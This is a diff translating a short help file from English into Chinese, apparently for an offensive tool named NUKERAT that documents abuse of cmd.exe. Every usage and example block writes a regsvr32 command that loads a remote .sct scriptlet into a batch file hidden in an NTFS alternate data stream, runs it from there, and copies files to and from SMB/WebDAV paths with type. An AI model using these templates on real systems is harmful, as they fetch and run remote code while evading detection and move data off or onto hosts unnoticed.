@@ -1,23 +1,23 @@
-ABOUT
+关于
     Windows command interpreter.
     Writes and runs batch from ADS, and uses type with WebDAV paths to
     download or upload files.
 
-USAGE:
+用法：
     cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
     cmd.exe - < {PATH}:payload.bat
     type {PATH_SMB} > {PATH_ABSOLUTE}
     type {PATH_ABSOLUTE} > {PATH_SMB}
 
-EXAMPLES:
+示例：
     cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
     cmd.exe - < {PATH}:payload.bat
     type {PATH_SMB} > {PATH_ABSOLUTE}
     type {PATH_ABSOLUTE} > {PATH_SMB}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
